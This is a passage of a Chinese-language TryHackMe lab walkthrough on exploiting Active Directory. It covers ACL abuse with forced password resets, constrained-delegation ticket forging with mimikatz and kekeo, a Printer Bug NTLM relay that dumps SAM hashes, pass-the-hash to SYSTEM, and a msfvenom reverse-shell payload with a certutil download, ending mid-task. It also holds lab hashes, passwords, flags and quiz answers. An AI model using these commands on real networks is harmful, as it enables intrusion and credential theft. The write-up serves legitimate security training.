# 前置代理

这个房间我在本地无法直连vpn，需要加前置代理

## ssh
只能转发tcp

ssh动态绑定本地转发端口
```
ssh -N -D 127.0.0.1:9050 root@xxxx
```
在ovpn最前面加这两行
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.83.101     #THMDC的ip
nameserver 114.114.114.114   #真实的DNS地址，以保证kali还能连接网络
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[~]
└─# nslookup thmdc.za.tryhackme.loc
Server:         10.200.83.101
Address:        10.200.83.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.83.101

```

# 获取用户凭据

登录```http://distributor.za.tryhackme.loc/creds```生成一个用户登录凭据

```
Your credentials have been generated: Username: max.smith Password: Kdbt1458
```

ssh登录
```
ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
```

# Task 2  Exploiting Permission Delegation


ACE

**ForceChangePassword**：我们可以在不知道用户当前密码的情况下设置用户当前密码。
**AddMembers**：我们有能力将用户（包括我们自己的帐户）、组或计算机添加到目标组。
**GenericAll**：我们可以完全控制对象，包括更改用户密码、注册 SPN 或将 AD 对象添加到目标组的能力。
**GenericWrite**：我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，这将导致脚本在用户下次登录时执行。
**WriteOwner**：我们有能力更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的额外权限。
**WriteDACL**：我们有能力将新的 ACE 写入目标对象的DACL。例如，我们可以编写一个 ACE，授予我们的帐户对目标对象的完全控制权。
**AllExtendedRights**：我们能够针对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力。


thm提供的json我本地无法识别，重新收集一份
```
PS C:\Users\max.smith\Documents> certutil -urlcache -split -f "http://10.50.81.218/SharpHound.exe" SharpHound.exe   
****  Online  ****
  000000  ...
CertUtil: -URLCache command completed successfully.
PS C:\Users\max.smith\Documents> .\SharpHound.exe -c all
-----------------------------------------------
Initializing SharpHound at 9:43 AM on 8/11/2022
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container


[+] Creating Schema map for domain ZA.TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=ZA,DC=TRYHACKME,DC=LOC 
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 17 MB RAM
[+] Creating Schema map for domain TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=TRYHACKME,DC=LOC
Status: 5128 objects finished (+5128 512.8)/s -- Using 58 MB RAM
Enumeration finished in 00:00:10.7635721
Compressing data to .\20220811094325_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 9:43 AM on 8/11/2022! Happy Graphing!

PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/11/2022   9:43 AM         307482 20220811094325_BloodHound.zip
-a----        8/11/2022   9:42 AM         833536 SharpHound.exe
-a----        8/11/2022   9:43 AM        1092647 Y2Y1YjhlMjMtNjA5Ny00YjA5LWFmOTMtZTc5YjA1NTU3YzNm.bin


```


拷贝回kali
```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# scp za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc:C:/Users/max.smith/Documents/20220811094325_BloodHound.zip .
za.tryhackme.loc\max.smith@thmwrk1.za.tryhackme.loc's password: 
20220811092711_BloodHound.zip   
```

从本用户到```TIER 2 ADMINS```的一条攻击路径


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660208864433.jpg)


本用户（max）属于```Domain users```用户组

```Domain users```用户组可以添加任何成员到```IT SUPPORT```用户组

```IT SUPPORT```用户组可以强制更改用户```T2_HENRY.HARVEY```的密码

用户```T2_HENRY.HARVEY```属于```TIER 2 ADMINS```用户组



首先，将当前账号添加进```IT Support```用户组，然后用Get-ADGroupMember验证添加结果
```
PS C:\> Add-ADGroupMember "IT Support" -Members "max.smith"
PS C:\> Get-ADGroupMember -Identity "IT Support"

...
...
distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : max.smith
objectClass       : user
objectGUID        : f0cd5ecd-6a42-4eff-8015-071e1dc3747b
SamAccountName    : max.smith
SID               : S-1-5-21-3885271727-2693558621-2658995185-1142

```


获取"Tier 2 Admins"组成员，看到有t2_henry.harvey的信息
```
PS C:\> Get-ADGroupMember -Identity "Tier 2 Admins"

...
...

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

```


强制修改密码,报错报Access is denied
```
PS C:\> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force 
PS C:\> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password               
Set-ADAccountPassword : Access is denied 
At line:1 char:1
+ Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (t2_henry.harvey:ADAccount) [Set-ADAccountPassword], UnauthorizedA  
   ccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.M  
   anagement.Commands.SetADAccountPassword

```

教程说需要等10分钟断开再连ssh测试,原因是：

> 权限尚未通过域传播。这最多可能需要 10 分钟。最好的方法是终止您的 SSH 或RDP会话，稍作休息，然后重新验证并重试。您也可以运行gpupdate /force然后断开连接并重新连接，这在某些情况下会导致同步发生得更快

几分钟后再次修改，修改成功
```
PS C:\Users\max.smith> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force
PS C:\Users\max.smith> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password
PS C:\Users\max.smith>  

```

现在可以通过```t2_henry.harvey:max.123456```登录ssh
```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# ssh za.tryhackme.loc\\t2_henry.harvey@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_henry.harvey@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>whoami
za\t2_henry.harvey

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>hostname
THMWRK1

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>

```

> Which ACE would allow you to update any non-protected parameter of a target object?

> GenericWrite

> What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?

> THM{Permission.Delegation.FTW!}

# Task 3  Exploiting Kerberos Delegation

## 可以委派的服务类型

**HTTP** - Used for web applications to allow pass-through authentication using AD credentials.（用于 Web 应用程序以允许使用 AD 凭据进行直通身份验证）
**CIFS** - Common Internet File System is used for file sharing that allows delegation of users to shares.（通用 Internet 文件系统用于文件共享，允许用户委派共享）
**LDAP** - Used to delegate to the LDAP service for actions such as resetting a user's password.（用于委托 LDAP 服务执行操作，例如重置用户密码）
**HOST** - Allows delegation of account for all activities on the host.(允许为主机上的所有活动委派帐户)
**MSSQL** - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.(允许将用户帐户委派给 SQL 服务，以对数据库进行直通身份验证。)

## 约束委派利用

枚举约束委派
```
PS C:\> Import-Module C:\Tools\PowerView.ps1 
PS C:\> Get-NetUser -TrustedToAuth 


logoncount               : 34
badpasswordtime          : 8/11/2022 1:52:18 PM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 8/11/2022 12:23:51 PM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 8/11/2022 11:23:51 AM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,  
                           http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 8/12/2022 2:26:43 AM
badpwdcount              : 0
cn                       : IIS Server 
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 147551

```

 svcIIS 帐户可以委托 THMSERVER1 上的HTTP和 WSMAN 服务


因为上面得到的t2_henry.harvey是本地管理员，可以导出本地哈希密码
```
PS C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53  
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                   
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # token::elevate 
Token Id  : 0 
User name :   
SID name  : NT AUTHORITY\SYSTEM 

488     {0;000003e7} 1 D 17550          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary 
 -> Impersonated !                                                                                      
 * Process Token : {0;001c4448} 0 D 2471194     ZA\t2_henry.harvey      S-1-5-21-3885271727-2693558621-2658995185-4275  (12g,24p)       Primary 
 * Thread Token  : {0;000003e7} 1 D 2503814     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)              
                                                                                                                                   
mimikatz # lsadump::secrets                                                                                                        
Domain : THMWRK1 
SysKey : a1403e57976b472bce5f231922ca3942

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) 
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc 

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 

Secret  : $MACHINE.ACC
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db 
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e 
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0  
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31  
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431 

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 9
7 ec 7f 49 a1 79 15 d9 a0 04 ac 58  
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 9
7 ec 7f 49 a1 79 15 d9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@

```

明文密码：Password1@



根据上面的明文密码，使用kekeo生成tgt
```
PS C:\> C:\Tools\kekeo\x64\kekeo.exe                                                                                               

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

看见生成了一张tgt

```
TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

根据上面的tgt，请求tgs

参数说明
- tgt - 我们提供在上一步中生成的TGT 。
- user - 我们要模拟的用户。由于 t2_ 帐户对工作站具有管理访问权限，因此可以安全地假设 t1_ 帐户对服务器具有管理访问权限，因此请选择您要模拟的 t1_ 帐户。
- service - 我们要使用委托来模拟的服务。我们首先为HTTP服务生成一个 TGS 。然后我们可以为 WSMAN 服务重新运行相同的命令。

```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:htt
p/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [8/12/2022 5:26:27 AM ; 8/12/2022 3:26:27 PM] {R:8/19/2022 5:26:27 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): cbf2869f6ee1b270c02f3357441243e499dbe707779e9fb3fa2bd540637dfb8a
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.83.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

由结果可见生成了两张tgs
```
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

用mimikatz导入上面的两张tgs,然后退出mimikatz

```
PS C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe                                                                                                                             
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
Privilege '20' OK
 
* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # exit
Bye!

```


使用klist查看导入的tgs
```
PS C:\> klist
Current LogonId is 0:0x1c4448

Cached Tickets: (2)

        Server: svcIIS @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/12/2022 5:30:42 (local)
        End Time:   8/12/2022 15:26:27 (local)
        Renew Time: 8/19/2022 5:26:27 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: t1_trevor.jones @ ZA.TRYHACKME.LOC
        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/12/2022 5:30:42 (local)
        End Time:   8/12/2022 15:26:27 (local)
        Renew Time: 8/19/2022 5:26:27 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```


在当前tgs的上下文中建立一个thmserver1的session
```
PS C:\> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> cd c:/users/administrator/desktop
[thmserver1.za.tryhackme.loc]: PS C:\users\administrator\desktop> ls


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2022   2:10 PM             92 flag2.txt

```

flag
```
[thmserver1.za.tryhackme.loc]: PS C:\users\administrator\desktop> type flag2.txt
THM{Constrained.Delegation.Can.Be.Very.Bad} 
```

> Which Kerberos Delegation type allows for delegation of all services?

> Unconstrained Delegation

> Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

> Resource-Based Constrained Delegation

> Which Constrained Delegation service allows access to the file system of the system via delegation?

> CIFS

> What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?

> THM{Constrained.Delegation.Can.Be.Very.Bad}

# Task 4  Exploiting Automated Relays

## The Printer Bug

利用条件

1. A valid set of AD account credentials.（一组有效的 AD 帐户凭据。）
2. Network connectivity to the target's SMB service.（与目标的 SMB 服务的网络连接。）
3. The target host must be running the Print Spooler service.（目标主机必须运行 Print Spooler 服务。）
4. The hosts must not have SMB signing enforced.（主机不得强制执行 SMB 签名。）


WMI 查询目标主机有没有开启Print Spooler 服务。

```
PS C:\> hostname
THMWRK1
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc 


Location      :  
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

```

## SMB Signing（SMB 签名）

nmap扫描 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc两台主机是否开启了smb强制签名

```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 02:26 EDT
Nmap scan report for thmserver1.za.tryhackme.loc (10.200.83.201)
Host is up (0.58s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for thmserver2.za.tryhackme.loc (10.200.83.202)
Host is up (0.33s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap done: 2 IP addresses (2 hosts up) scanned in 18.92 seconds

```

显示Message signing enabled but not required，表示开启了smb，但未强制签名

所有条件满足

执行攻击：

1. kali开启ntlmrelayx监听，smb参数里的IP是我们需要收集哈希信息的IP，即THMSERVER1。注意，这里如果填域名的话会走kerberos认证，填IP才会走NTLM认证，所以必须填IP

```
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.83.201 -smb2support -debug
```

2. 在THMWRK1上触发SMB流量,最后那个IP是我们kali的IP地址

```
PS C:\tools> .\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.81.218
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\THMSERVER2.za.tryhackme.loc, CaptureServer: \\10.50.81.218
Target server attempted authentication and got an access denied.  If coercing authentication to 
an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expecte
d and indicates the coerced authentication worked.

```

3. ntlmrelayx收到smb流量

```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.83.201 -smb2support -debug
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from ZA/THMSERVER2$@10.200.83.202 controlled, attacking target smb://10.200.83.201
[*] Authenticating against smb://10.200.83.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets for user ZA/THMSERVER2$
[*] SMBD-Thread-4: Connection from ZA/THMSERVER2$@10.200.83.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x4e05e7ea4fdddde75aa56010474948dc
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
[*] Done dumping SAM hashes for host: 10.200.83.201
[*] Stopping service RemoteRegistry

```

可以看到已经打印出THMSERVER1的sam数据库里的哈希信息

```
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
```


pth 拿到flag

```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py  -hashes "aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c" ServerAdmin@10.200.83.201                                                                   1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.200.83.201.....
[*] Found writable share ADMIN$
[*] Uploading file FvdiIslE.exe
[*] Opening SVCManager on 10.200.83.201.....
[*] Creating service Yzmr on 10.200.83.201.....
[*] Starting service Yzmr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
THMSERVER1

C:\Windows\system32> cd c:/users/Administrator.ZA/desktop
 
c:\Users\Administrator.ZA\Desktop> dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\Administrator.ZA\Desktop

2022/05/01  15:49    <DIR>          .
2022/05/01  15:49    <DIR>          ..
2022/05/01  15:50                25 flag3.txt
               1 File(s)             25 bytes
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
               2 Dir(s)  50�903�248�896 bytes free


c:\Users\Administrator.ZA\Desktop> type flag3.txt
THM{Printing.Some.Shellz}

```


> How often (in days) are the passwords of Windows machine accounts rotated by default?

> 30

> What should not be enforced if we want to relay an SMB authentication attempt?

> SMB Signing

> What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?

> THM{Printing.Some.Shellz}


# Task 5  Exploiting AD Users

在THMSERVER1的trevor.local用户文档里找到一个keepass文件
```
c:\Users\t1_trevor.jones\Documents> dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\t1_trevor.jones\Documents

2022/04/30  16:36    <DIR>          .
2022/04/30  16:36    <DIR>          ..
2022/04/30  16:36             2�190 PasswordDatabase.kdbx

```

编译一个meterpreter
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.81.218 LPORT="4444" -f exe -o shell.exe
```


传到靶机
```
certutil.exe -urlcache -split -f http://10.50.81.218/shell.exe
```

监听
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.81.218; set LPORT '4444'; exploit"
```

执行触发，收到rev shell
```
